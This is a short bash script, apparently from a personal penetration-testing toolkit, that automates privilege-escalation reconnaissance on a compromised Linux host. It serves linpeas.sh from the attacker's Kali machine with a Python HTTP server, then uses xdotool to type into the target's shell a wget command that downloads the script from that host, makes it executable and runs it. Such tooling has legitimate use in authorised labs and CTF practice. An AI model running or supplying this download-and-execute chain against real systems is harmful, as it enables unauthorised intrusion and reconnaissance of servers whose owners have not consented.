#!/bin/bash

: '
download linpeas to server and execute
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

# wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O ~/Desktop/base/code/xdotool/scripts/reconnaissance/linux/.files/linpeas.sh

cd ~/Desktop/base/code/xdotool/scripts/reconnaissance/linux/.files
python3 -m http.server 1337 &
HTTP_PID=$!

paste_command "wget http://${KALI_IP}:1337/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && cd /tmp && ls -alF /tmp && bash /tmp/linpeas.sh"
xdotool key Return
sleep 10

kill $HTTP_PID